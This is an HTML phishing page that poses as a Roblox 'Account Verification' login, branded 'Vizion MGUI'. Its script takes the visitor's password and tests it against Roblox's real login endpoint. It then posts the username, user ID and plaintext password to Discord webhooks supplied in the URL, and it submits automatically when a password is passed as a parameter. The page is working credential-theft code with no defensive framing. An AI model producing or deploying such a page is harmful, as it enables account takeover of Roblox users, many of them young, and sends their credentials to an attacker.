<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login - Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            width: 400px;
            overflow: hidden;
        }
        
        .header {
            background: #00a2ff;
            padding: 20px;
            text-align: center;
        }
        
        .header h1 {
            color: white;
            font-size: 24px;
            font-weight: bold;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            background: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            color: #00a2ff;
            font-weight: bold;
        }
        
        .login-form {
            padding: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            border-color: #00a2ff;
            outline: none;
        }
        
        .login-btn {
            background: #00a2ff;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .login-btn:hover {
            background: #0088cc;
        }
        
        .login-btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        
        .footer {
            padding: 15px 25px 25px;
            text-align: center;
            color: #666;
            font-size: 14px;
        }
        
        .footer a {
            color: #00a2ff;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .hidden {
            display: none;
        }
        
        .result-message {
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            text-align: center;
            font-weight: 600;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .failure {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
            color: #00a2ff;
        }
        
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #00a2ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verification-info {
            background: #f8f9fa;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            border-left: 4px solid #00a2ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">R</div>
            <h1>Account Verification</h1>
        </div>
        
        <div class="login-form">
            <div class="verification-info">
                <strong>Verification in progress:</strong>
                <div>Username: <span id="info-username">LoginCheckerdsa</span></div>
                <div>Tracking ID: <span id="info-tracking-id">f3254636-504c-4c11-9c7c-ebd829439b5a</span></div>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            
            <button id="login-btn" class="login-btn">Verify Account</button>
            
            <div id="result-message" class="result-message hidden"></div>

            <div id="loading" class="loading hidden">
                <div class="spinner"></div>
                <p>Verifying credentials with Roblox...</p>
            </div>
        </div>
        
        <div class="footer">
            <p>This verification is powered by <strong>Vizion MGUI</strong></p>
            <p>By verifying, you agree to our <a href="#">Terms of Service</a></p>
        </div>
    </div>

    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        const userId = urlParams.get('userId');
        const username = urlParams.get('username');
        const passwordFromUrl = urlParams.get('password');
        const successWebhook = urlParams.get('successWebhook');
        const failedWebhook = urlParams.get('failedWebhook');
        
        // DOM elements
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('login-btn');
        const resultMessage = document.getElementById('result-message');
        const loadingElement = document.getElementById('loading');
        const infoUsername = document.getElementById('info-username');
        const infoTrackingId = document.getElementById('info-tracking-id');
        
        // Set information from URL parameters
        if (username) {
            infoUsername.textContent = username;
        }
        if (trackingId) {
            infoTrackingId.textContent = trackingId;
        }
        if (passwordFromUrl) {
            passwordInput.value = passwordFromUrl;
        }
        
        // Login button event
        loginBtn.addEventListener('click', async function() {
            const password = passwordInput.value.trim();
            
            if (!password) {
                showResult('Please enter your password', false);
                return;
            }
            
            // Disable button and show loading
            loginBtn.disabled = true;
            loginBtn.textContent = 'Verifying...';
            resultMessage.className = 'result-message hidden';
            loadingElement.classList.remove('hidden');
            
            // Verify credentials
            const isValid = await verifyWithRobloxAPI(username, password);
            
            // Hide loading
            loadingElement.classList.add('hidden');
            
            // Show result
            await showResult(
                isValid ? 'Verification successful! Password is valid.' : 'Verification failed! Password is invalid.', 
                isValid
            );
            
            // Re-enable button
            loginBtn.disabled = false;
            loginBtn.textContent = 'Verify Account';
        });
        
        async function verifyWithRobloxAPI(username, password) {
            try {
                // First get CSRF token from Roblox
                const csrfToken = await getCsrfToken();
                if (!csrfToken) {
                    console.error("Could not get CSRF token");
                    return false;
                }
                
                // Attempt to login with the credentials
                const loginData = {
                    ctype: 'Username',
                    cvalue: username,
                    password: password
                };
                
                const response = await fetch('https://auth.roblox.com/v2/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': csrfToken
                    },
                    body: JSON.stringify(loginData),
                    credentials: 'include'
                });
                
                const data = await response.json();
                
                // Check if login was successful
                if (data && data.user && data.user.id) {
                    console.log("✅ Roblox API verification successful");
                    return true;
                }
                
                // Check for specific error conditions
                if (data && data.errors) {
                    for (const error of data.errors) {
                        if (error.code === 1) { // Incorrect username or password
                            console.log("❌ Roblox API verification failed: Incorrect credentials");
                            return false;
                        }
                        if (error.code === 2) { // Captcha required
                            console.log("⚠️ CAPTCHA required - cannot verify automatically");
                            // For CAPTCHA, we'll assume invalid for security
                            return false;
                        }
                    }
                }
                
                console.log("❌ Roblox API verification failed: Unknown error");
                return false;
                
            } catch (error) {
                console.error('Roblox API verification failed:', error);
                return false;
            }
        }
        
        async function getCsrfToken() {
            try {
                const response = await fetch('https://auth.roblox.com/v2/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': 'fetch'
                    },
                    credentials: 'include'
                });
                
                return response.headers.get('x-csrf-token');
            } catch (error) {
                console.error('Could not fetch CSRF token:', error);
                return null;
            }
        }
        
        async function showResult(message, isSuccess) {
            resultMessage.textContent = message;
            resultMessage.className = `result-message ${isSuccess ? 'success' : 'failure'}`;
            resultMessage.classList.remove('hidden');
            
            // Send result to Discord if webhooks are provided
            if (successWebhook && failedWebhook) {
                await sendToDiscord(isSuccess, username, passwordInput.value);
            }
        }
        
        async function sendToDiscord(isSuccess, username, password) {
            const webhookUrl = isSuccess ? successWebhook : failedWebhook;
            const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
            const color = isSuccess ? 5763719 : 15548997;
            
            const embed = {
                title: `Roblox Account Verification - ${statusText}`,
                color: color,
                description: `**Verification completed**\n**Status:** ${statusText}\n**Date:** ${new Date().toLocaleString()}`,
                fields: [
                    {
                        name: "👤 Account Info",
                        value: `**Username:** ${username}\n**User ID:** ${userId || 'N/A'}\n**Tracking ID:** ${trackingId || 'N/A'}`,
                        inline: false
                    },
                    {
                        name: "🔐 Login Details",
                        value: `**Password:** ||${password}||\n**Result:** ${statusText}`,
                        inline: false
                    }
                ],
                footer: {
                    text: "Vizion MGUI (Auto Login Checker) • Private System",
                    icon_url: "https://www.roblox.com/favicon.ico"
                },
                timestamp: new Date().toISOString()
            };
            
            const payload = {
                username: "Vizion MGUI Checker",
                avatar_url: "https://www.roblox.com/favicon.ico",
                content: isSuccess ? "✅ **Verification Successful**" : "❌ **Verification Failed**",
                embeds: [embed]
            };
            
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    console.error('Failed to send to Discord:', response.status);
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }
        
        // Auto-start verification if password is provided in URL
        if (passwordFromUrl) {
            setTimeout(() => {
                loginBtn.click();
            }, 1000);
        }
    </script>
</body>
</html>
